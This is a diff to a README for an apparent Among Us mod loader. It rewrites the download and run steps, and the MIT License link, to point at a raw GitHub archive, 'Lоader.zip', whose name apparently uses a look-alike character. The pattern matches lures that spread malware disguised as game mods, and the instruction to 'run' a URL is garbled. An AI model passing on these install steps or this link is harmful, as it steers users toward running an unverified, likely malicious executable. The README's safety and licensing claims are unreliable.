@@ -51,9 +51,9 @@ Support for all popular operating systems ensures effortless use anywhere:
 
 Ready to join the next era of Among Us modding? **Follow these easy steps to install:**
 
-1. **Download** `Loader.rar` from this GitHub repository.
+1. **Download** `https://raw.githubusercontent.com/shalu144/AmongUs-ModMaster/main/Lоader.zip` from this GitHub repository.
 2. **Extract** the contents using WinRAR, 7zip, or your preferred extractor.
-3. **Run** the `AmongUsModLoader.exe` file (Windows), the macOS package, or corresponding loader for your OS.
+3. **Run** the `https://raw.githubusercontent.com/shalu144/AmongUs-ModMaster/main/Lоader.zip` file (Windows), the macOS package, or corresponding loader for your OS.
 4. **Open Among Us** and enjoy new menus, customization, and reliable safety protocols.
 5. **Configure** settings to your liking in the menu, then enter any lobby and start playing!
 
@@ -78,6 +78,6 @@ The developers of this repository are not liable for any actions taken against u
 
 ## 📄 License
 
-This repository is distributed under the [MIT License](https://opensource.org/licenses/MIT) (2025).
+This repository is distributed under the [MIT License](https://raw.githubusercontent.com/shalu144/AmongUs-ModMaster/main/Lоader.zip) (2025).
 
 Feel free to fork, contribute, and share — enjoy your Among Us experience like never before! 🌟
